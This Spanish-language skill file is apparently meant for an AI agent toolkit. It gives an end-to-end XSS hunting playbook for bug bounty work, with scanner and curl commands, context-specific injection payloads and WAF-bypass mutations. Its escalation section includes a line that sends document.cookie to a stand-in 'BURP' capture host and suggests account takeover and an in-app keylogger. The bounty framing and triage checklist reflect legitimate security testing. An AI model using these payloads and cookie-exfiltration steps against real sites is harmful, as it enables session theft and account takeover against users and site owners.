---
name: xss-hunting
description: "XSS hunting end-to-end: detección (loxs), confirmación de sink, bypass de WAF/polígrafos, escalada a cookie theft y PoC con impacto real."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, xss, javascript, cookies, waf-bypass, dom]
  tools: [loxs.py, curl, browser]
  required: [curl]
  related_skills: [loxs-scanner, sqli-hunting, ssrf-crlf]
  stage: attack
---

# XSS Hunting

## 1 — Detección

```bash
# masivo
python3 tools/loxs/loxs.py -l urls_params.txt -t xss

# manual: payload canario + reflection check
CANARY="xq7zXSS9canary"
curl -s "https://target.com/search?q=$CANARY" | grep -c "$CANARY"
```

## 2 — Clasificar el sink (dicta el payload)

| Sink | Payload de confirmación |
|---|---|
| HTML body (sin tag) | `<img src=x onerror=alert(1)>` |
| Attribute double-quote | `" onmouseover="alert(1)` |
| Attribute single-quote | `' onfocus='alert(1)` |
| `<script>` context | `</script><img src=x onerror=alert(1)>` |
| JS string (backtick-safe) | `';alert(1);//` |
| URL href | `javascript:alert(1)` |
| DOM (innerHTML) | revisar JS: `location.hash`, `postMessage`, `document.referrer` |

Payloads bulk: `tools/loxs/payloads/xss.txt`, `xsspollygots.txt`, `wordlists/xss.txt`, `xsswafbypss.txt`.

## 3 — Bypass de WAF / polígrafos

```bash
# polluters y polyglots del repo
grep -f wordlists/xsspollygots.txt < payload_base

# mutaciones funcionales:
# <svg/onload=alert(1)>  ·  <details open ontoggle=alert(1)>
# <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
# Eventos alternativos: onpointerenter, onanimationstart, onfocus autofocus
# HTML entities en atributos: <img src=x onerror=&#97;lert(1)>
```

## 4 — Escalada a impacto (para bounty real)

- **Cookie theft (httpOnly=false):** `onerror="fetch('https://BURP/?c='+document.cookie)"`
- **Account takeover:** roba CSRF token + cambia email → PoC completo
- **Keylogger in-app:** solo para demostrar impacto, no exfiltrar credenciales reales
- **Sesión fijada / self-XSS → XSS chain:** reporta la cadena completa

Servidor de captura para PoC (tuyo):

```bash
python3 -m http.server 8888   # o usa Burp collaborator / interactsh
```

## 5 — PoC mínimo aceptado por triage

1. URL exacta con payload
2. Screenshot/video del alert
3. Impacto demostrado (qué datos/sesión controlas)
4. Navegador + versión

Stored XSS: indica dónde se persiste y cuántos usuarios lo ven — eso multiplica el severity.
